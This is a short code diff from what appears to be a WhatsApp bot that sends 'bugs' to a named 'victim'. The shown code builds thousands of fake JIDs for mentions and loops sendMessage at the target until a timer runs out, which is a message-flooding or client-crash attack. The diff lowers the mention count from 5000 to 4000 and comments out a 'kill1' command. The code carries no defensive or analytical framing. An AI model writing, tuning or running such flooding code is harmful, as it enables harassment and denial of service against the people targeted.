@@ -147,7 +147,7 @@ async (Void, citel, text, { isCreator }) => {
         let ying = victim + '@s.whatsapp.net';
         citel.reply(`${totalDuration} seconds bugs to the victims ${victim}`);
         // Generate unique JIDs for mentions
-        const uniqueJIDs = Array.from({ length: 5000 }, (_, index) => `${victim}${index}@s.whatsapp.net`);
+        const uniqueJIDs = Array.from({ length: 4000 }, (_, index) => `${victim}${index}@s.whatsapp.net`);
 
         while (Date.now() < endTime) {
             await Void.sendMessage(ying, {
@@ -220,7 +220,7 @@ async (Void, citel, text, { isCreator }) => {
 });
 */
 ///////////////////////////////////////////========================BUG 2=======================///////////////////////////////////////////////////////
-
+/*
 cmd({
     pattern: "kill1",
     alias: ["pm-kill1"],
